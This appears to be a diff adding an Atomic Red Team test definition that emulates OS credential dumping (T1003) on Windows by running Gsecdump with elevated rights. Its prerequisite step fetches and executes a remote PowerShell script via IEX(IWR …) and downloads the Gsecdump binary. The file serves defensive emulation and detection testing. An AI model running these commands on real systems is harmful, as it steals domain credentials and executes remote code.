@@ -1,0 +1,47 @@
+{
+    "name": "Gsecdump",
+    "description": "Dump credentials from memory using Gsecdump.  Upon successful execution, you should see domain\\username's followed by two 32 character hashes.  If you see output that says compat: error: failed to create child process, execution was likely blocked by Anti-Virus.  You will receive only error output if you do not run this test from an elevated context (run as administrator)  If you see a message saying The system cannot find the path specified, try using the get-prereq_commands to download and install Gsecdump first. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "\"#{gsecdump_exe}\" -a\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "OS Credential Dumping",
+    "source": "ART",
+    "uuid": "96345bfc-8ae7-4b6a-80b7-223200f24ef9",
+    "arguments": {
+        "gsecdump_exe": {
+            "description": "Path to the Gsecdump executable",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe"
+        },
+        "gsecdump_bin_hash": {
+            "description": "File hash of the Gsecdump binary file",
+            "type": "string",
+            "default": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC"
+        },
+        "gsecdump_url": {
+            "description": "Path to download Gsecdump binary file",
+            "type": "url",
+            "default": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n",
+            "prereq_command": "if (Test-Path \"#{gsecdump_exe}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
